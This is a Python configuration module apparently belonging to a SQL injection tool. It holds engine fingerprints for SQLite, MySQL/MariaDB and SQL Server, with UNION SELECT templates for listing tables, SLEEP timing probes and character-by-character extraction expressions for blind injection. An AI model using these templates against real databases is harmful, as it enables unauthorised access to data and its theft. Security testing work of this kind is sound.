from dataclasses import dataclass

"""
Colors
"""

RESET = "\033[0m"

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
BOLD = "\033[1m"

"""
Injection context
"""


@dataclass
class InjectionContext:
    prefix: str
    suffix: str
    name: str


"""
Heigh values
"""

HEIGH_ELEMENT_NAME_LENGTH = 64
HEIGH_COL_VALUE_LENGTH = 1024
HEIGH_ELEMENT_COUNT = 1000
HEIGH_MAX_CHAR_LENGTH = 1_000_000
HEIGH_MAX_NUMERIC_VALUE = 1_000_000_000_000


"""
Skipped system schemas (which are )not user-created application databases).
"""

SYSTEM_DATABASES = {
    "information_schema",
    "mysql",
    "performance_schema",
    "sys",
}


"""
Fingerprints of database engines
"""


@dataclass(frozen=True)
class DatabaseFingerprint:
    schema: str
    version: str
    sleep: str | None
    length: str
    char: str | None
    limit: str

    # To check which column has the right type
    table_name: str
    table_name_expression: str


fingerprints = {
    "sqlite": DatabaseFingerprint(
        schema="sqlite_master",
        version="sqlite_version()",
        sleep=None,
        length="LENGTH({expression})",
        char="unicode(substr({expression},{digit},1))",
        table_name="name",
        table_name_expression="UNION SELECT {columns} FROM sqlite_master WHERE type = 'table' LIMIT 1,2",
        limit="LIMIT {nbr},1",
    ),
    "mysql_mariadb": DatabaseFingerprint(
        schema="information_schema",
        version="VERSION()",
        sleep="SLEEP({seconds})",  # Usage: `fingerprint.sleep.format(seconds=1)`
        length="LENGTH({expression})",
        char="ASCII(SUBSTRING({expression},{digit},1))",
        table_name="table_name",
        table_name_expression="UNION SELECT {columns} FROM information_schema.tables LIMIT 1,2",
        limit="LIMIT {nbr},1",
    ),
    "mariadb": DatabaseFingerprint(
        schema="information_schema",
        version="VERSION()",
        sleep="SLEEP({seconds})",
        length="LENGTH({expression})",
        char="ASCII(SUBSTRING({expression},{digit},1))",
        table_name="table_name",
        table_name_expression="UNION SELECT {columns} FROM information_schema.tables LIMIT 1,2",
        limit="LIMIT {nbr},1",
    ),
    "microsoft sql server": DatabaseFingerprint(
        schema="sys.tables",
        version="@@VERSION",
        sleep=None,
        length="LEN({expression})",
        char="ASCII(SUBSTRING({expression},{digit},1))",
        table_name="table_name",
        table_name_expression="UNION SELECT TOP 2 {columns} FROM information_schema.tables",
        limit="ORDER BY {element} OFFSET {{nbr}} ROWS FETCH NEXT 1 ROW ONLY",
    ),
}


"""
Analysis
"""

DIFFER_LENGTH_COL_TYPE = 50
DIFFER_LENGTH_BOOL = 50
DIFFER_LENGTH_COL_COUNT = 100
DIFF_MARKER = "DF4456DdgZERZERAA768"


"""
Data types
"""

STRING_TYPES = {
    # MySQL / MariaDB
    "char",
    "varchar",
    "tinytext",
    "text",
    "mediumtext",
    "longtext",
    "enum",
    "set",

    # SQL Server
    "nchar",
    "nvarchar",
    "ntext",

    # SQLite
    "character",
    "clob",
}

NUMERIC_TYPES = {
    # MySQL / MariaDB
    "tinyint",
    "smallint",
    "mediumint",
    "int",
    "integer",
    "bigint",

    # SQLite
    "int2",
    "int8",
}

BOOLEAN_TYPES = {
    # SQL Server
    "bit",

    # MySQL / MariaDB
    "boolean",
    "bool",
}
